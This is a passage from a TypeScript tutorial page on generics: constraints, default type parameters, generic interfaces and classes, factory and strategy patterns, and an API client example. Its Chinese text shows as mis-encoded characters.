class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">function</span> getSize&lt;T <span class="hljs-keyword">extends</span> &#123; <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> &#125;&gt;(<span class="hljs-attr">obj</span>: T): <span class="hljs-built_in">number</span> &#123;<br>  <span class="hljs-keyword">return</span> obj.<span class="hljs-property">length</span>;<br>&#125;<br><br><span class="hljs-title function_">getSize</span>(&#123; <span class="hljs-attr">size</span>: <span class="hljs-number">10</span> &#125;); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼šç¼ºå°‘ length å±æ€§</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ–¹æ³•1ï¼šæä¾›æ­£ç¡®ç±»å‹</span><br><span class="hljs-title function_">getSize</span>(&#123; <span class="hljs-attr">length</span>: <span class="hljs-number">10</span> &#125;);<br><br><span class="hljs-comment">// æ–¹æ³•2ï¼šæ‰©å±•çº¦æŸ</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Sizeable</span> &#123;<br>  <span class="hljs-attr">length</span>?: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">size</span>?: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> getSize&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sizeable</span>&gt;(<span class="hljs-attr">obj</span>: T): <span class="hljs-built_in">number</span> &#123;<br>  <span class="hljs-keyword">return</span> obj.<span class="hljs-property">length</span> ?? obj.<span class="hljs-property">size</span> ?? <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é”™è¯¯ï¼šé»˜è®¤ç±»å‹ä¸çº¦æŸå†²çª</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> = <span class="hljs-built_in">number</span>&gt; &#123; <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼é»˜è®¤ç±»å‹å¿…é¡»æ»¡è¶³çº¦æŸ</span><br>  <span class="hljs-attr">value</span>: T;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// çº¦æŸå’Œé»˜è®¤ç±»å‹éœ€å…¼å®¹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> = <span class="hljs-built_in">number</span>&gt; &#123;<br>  <span class="hljs-attr">value</span>: T;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-3-4-æ³›å‹åœ¨æ¥å£-ç±»ä¸­çš„é«˜çº§åº”ç”¨"><a href="#1-3-4-æ³›å‹åœ¨æ¥å£-ç±»ä¸­çš„é«˜çº§åº”ç”¨" class="headerlink" title="1.3.4 æ³›å‹åœ¨æ¥å£&#x2F;ç±»ä¸­çš„é«˜çº§åº”ç”¨"></a>1.3.4 æ³›å‹åœ¨æ¥å£&#x2F;ç±»ä¸­çš„é«˜çº§åº”ç”¨</h3><p><strong>æ³›å‹æ¥å£ï¼ˆGeneric Interfacesï¼‰</strong></p><p>åŸºç¡€æ¨¡å¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç®€å•æ³›å‹æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">KeyValuePair</span>&lt;K, V&gt; &#123;<br>  <span class="hljs-attr">key</span>: K;<br>  <span class="hljs-attr">value</span>: V;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">stringPair</span>: <span class="hljs-title class_">KeyValuePair</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = &#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;name&quot;</span>,<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&quot;Alice&quot;</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">numberPair</span>: <span class="hljs-title class_">KeyValuePair</span>&lt;<span class="hljs-built_in">number</span>, <span class="hljs-built_in">boolean</span>&gt; = &#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">value</span>: <span class="hljs-literal">true</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å‡½æ•°ç­¾åæ³›å‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¸¦è°ƒç”¨ç­¾åçš„æ³›å‹æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span>&lt;T, U&gt; &#123;<br>  (<span class="hljs-attr">input</span>: T): U;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">toUpperCase</span>: <span class="hljs-title class_">Transformer</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = <br>  <span class="hljs-function"><span class="hljs-params">str</span> =&gt;</span> str.<span class="hljs-title function_">toUpperCase</span>();<br>  <br><span class="hljs-keyword">const</span> <span class="hljs-attr">toNumber</span>: <span class="hljs-title class_">Transformer</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt; = <br>  <span class="hljs-function"><span class="hljs-params">str</span> =&gt;</span> <span class="hljs-built_in">parseFloat</span>(str);<br></code></pre></td></tr></table></figure><p><strong>æ³›å‹ç±»ï¼ˆGeneric Classesï¼‰</strong></p><p>åŸºæœ¬ç»“æ„ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;T&gt; &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-attr">content</span>: T;<br>  <br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">initialValue</span>: T</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span> = initialValue;<br>  &#125;<br>  <br>  <span class="hljs-title function_">getValue</span>(): T &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span>;<br>  &#125;<br>  <br>  <span class="hljs-title function_">setValue</span>(<span class="hljs-attr">newValue</span>: T): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span> = newValue;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> stringBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">&quot;Initial&quot;</span>);<br>stringBox.<span class="hljs-title function_">setValue</span>(<span class="hljs-string">&quot;New value&quot;</span>);<br><br><span class="hljs-keyword">const</span> numberBox = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">100</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numberBox.<span class="hljs-title function_">getValue</span>() * <span class="hljs-number">2</span>); <span class="hljs-comment">// 200</span><br></code></pre></td></tr></table></figure><p>é™æ€æˆå‘˜é™åˆ¶ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Factory</span>&lt;T&gt; &#123;<br>  <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼é™æ€æˆå‘˜ä¸èƒ½å¼•ç”¨ç±»å‹å‚æ•°</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-attr">default</span>: T;<br>  <br>  <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šé™æ€æˆå‘˜ä½¿ç”¨ç‹¬ç«‹æ³›å‹</span><br>  <span class="hljs-keyword">static</span> create&lt;U&gt;(<span class="hljs-attr">value</span>: U): <span class="hljs-title class_">Factory</span>&lt;U&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Factory</span>(value);<br>  &#125;<br>  <br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-attr">value</span>: T</span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ³›å‹çº¦æŸçš„é«˜çº§åº”ç”¨</strong></p><p>ç±»å‹å‚æ•°çº¦æŸï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç¡®ä¿ç±»å‹Tæœ‰idå±æ€§</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Repository</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Identifiable</span>&gt; &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-attr">items</span>: T[] = [];<br>  <br>  <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">item</span>: T</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">push</span>(item);<br>  &#125;<br>  <br>  <span class="hljs-title function_">findById</span>(<span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>): T | <span class="hljs-literal">undefined</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">id</span> === id);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>, <span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> userRepo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Repository</span>&lt;<span class="hljs-title class_">User</span>&gt;();<br>userRepo.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Alice&quot;</span>));<br><span class="hljs-keyword">const</span> user = userRepo.<span class="hljs-title function_">findById</span>(<span class="hljs-string">&quot;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°çº¦æŸï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¦æ±‚æ³›å‹Tå¿…é¡»æ˜¯ç±»ç±»å‹</span><br><span class="hljs-keyword">function</span> createInstance&lt;T&gt;(<span class="hljs-attr">ctor</span>: <span class="hljs-title function_">new</span> () =&gt; T): T &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>();<br>&#125;<br><br><span class="hljs-comment">// é«˜çº§ï¼šå¸¦å‚æ•°æ„é€ å‡½æ•°</span><br><span class="hljs-keyword">function</span> createWithParams&lt;T&gt;(<br>  <span class="hljs-attr">ctor</span>: <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; T,<br>  ...<span class="hljs-attr">args</span>: <span class="hljs-title class_">ConstructorParameters</span>&lt;<span class="hljs-keyword">typeof</span> ctor&gt;<br>): T &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>(...args);<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Point</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">public</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-title function_">createWithParams</span>(<span class="hljs-title class_">Point</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// Point &#123; x: 1, y: 2 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>æ¥å£ä¸ç±»çš„ç»„åˆæ¨¡å¼</strong></p><p>æ¨¡å¼1ï¼šå·¥å‚æ¥å£</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Factory</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">create</span>(): T;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CarFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Factory</span>&lt;<span class="hljs-title class_">Car</span>&gt; &#123;<br>  <span class="hljs-title function_">create</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BikeFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Factory</span>&lt;<span class="hljs-title class_">Bike</span>&gt; &#123;<br>  <span class="hljs-title function_">create</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bike</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> assembleProduct&lt;T&gt;(<span class="hljs-attr">factory</span>: <span class="hljs-title class_">Factory</span>&lt;T&gt;): T &#123;<br>  <span class="hljs-keyword">return</span> factory.<span class="hljs-title function_">create</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡å¼2ï¼šç­–ç•¥æ¨¡å¼</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PaymentStrategy</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">processPayment</span>(<span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">context</span>: T): <span class="hljs-built_in">boolean</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CreditCardStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentStrategy</span>&lt;<span class="hljs-title class_">CreditCardInfo</span>&gt; &#123;<br>  <span class="hljs-title function_">processPayment</span>(<span class="hljs-params"><span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">card</span>: <span class="hljs-title class_">CreditCardInfo</span></span>) &#123;<br>    <span class="hljs-comment">// ä¿¡ç”¨å¡æ”¯ä»˜é€»è¾‘</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PayPalStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PaymentStrategy</span>&lt;<span class="hljs-title class_">PayPalAccount</span>&gt; &#123;<br>  <span class="hljs-title function_">processPayment</span>(<span class="hljs-params"><span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">account</span>: <span class="hljs-title class_">PayPalAccount</span></span>) &#123;<br>    <span class="hljs-comment">// PayPalæ”¯ä»˜é€»è¾‘</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> processOrder&lt;T&gt;(<br>  <span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>,<br>  <span class="hljs-attr">strategy</span>: <span class="hljs-title class_">PaymentStrategy</span>&lt;T&gt;,<br>  <span class="hljs-attr">context</span>: T<br>) &#123;<br>  <span class="hljs-keyword">return</span> strategy.<span class="hljs-title function_">processPayment</span>(amount, context);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹æ¨å¯¼ä¸é»˜è®¤å€¼</strong></p><p>ç±»å‹å‚æ•°é»˜è®¤å€¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¥å£é»˜è®¤ç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PaginatedResponse</span>&lt;T = <span class="hljs-built_in">any</span>&gt; &#123;<br>  <span class="hljs-attr">data</span>: T[];<br>  <span class="hljs-attr">page</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">totalPages</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// ç±»é»˜è®¤ç±»å‹</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cache</span>&lt;T = <span class="hljs-built_in">string</span>&gt; &#123;<br>  <span class="hljs-keyword">private</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, T&gt;();<br>  <br>  <span class="hljs-title function_">set</span>(<span class="hljs-params"><span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">value</span>: T</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">map</span>.<span class="hljs-title function_">set</span>(key, value);<br>  &#125;<br>  <br>  <span class="hljs-title function_">get</span>(<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): T | <span class="hljs-literal">undefined</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">map</span>.<span class="hljs-title function_">get</span>(key);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨é»˜è®¤ç±»å‹</span><br><span class="hljs-keyword">const</span> stringCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>(); <span class="hljs-comment">// Cache&lt;string&gt;</span><br>stringCache.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Alice&quot;</span>);<br><br><span class="hljs-keyword">const</span> anyCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>&lt;<span class="hljs-built_in">any</span>&gt;();<br>anyCache.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;user&quot;</span>, &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Bob&quot;</span> &#125;);<br></code></pre></td></tr></table></figure><p>ä¸Šä¸‹æ–‡ç±»å‹æ¨å¯¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ¹æ®å®ç°è‡ªåŠ¨æ¨å¯¼ç±»å‹å‚æ•°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">StringContainer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Container</span>&lt;<span class="hljs-built_in">string</span>&gt; &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">item</span>: <span class="hljs-built_in">string</span></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>&#125;<br><br><span class="hljs-comment">// æ˜¾å¼æŒ‡å®šç±»å‹å‚æ•°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumberContainer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Container</span>&lt;<span class="hljs-built_in">number</span>&gt; &#123;<br>  <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">item</span>: <span class="hljs-built_in">number</span></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§å·¥ç¨‹æ¡ˆä¾‹</strong></p><p>æ¡ˆä¾‹1ï¼šAPI å®¢æˆ·ç«¯å°è£…</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiClient</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">fetchData</span>(<span class="hljs-attr">endpoint</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt;;<br>  <span class="hljs-title function_">postData</span>(<span class="hljs-attr">endpoint</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">data</span>: <span class="hljs-title class_">Partial</span>&lt;T&gt;): <span class="hljs-title class_">Promise</span>&lt;T&gt;;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonApiClient</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApiClient</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-attr">baseUrl</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>  <br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-attr">endpoint</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.baseUrl&#125;</span>/<span class="hljs-subst">$&#123;endpoint&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;<br>  <br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">postData</span>(<span class="hljs-attr">endpoint</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">data</span>: <span class="hljs-title class_">Partial</span>&lt;T&gt;): <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.baseUrl&#125;</span>/<span class="hljs-subst">$&#123;endpoint&#125;</span>`</span>, &#123;<br>      <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)<br>    &#125;);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> userClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonApiClient</span>&lt;<span class="hljs-title class_">User</span>&gt;(<span class="hljs-string">&quot;https://api.example.com/users&quot;</span>);<br><span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> userClient.<span class="hljs-title function_">fetchData</span>(<span class="hljs-string">&quot;123&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹2ï¼šçŠ¶æ€ç®¡ç†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span 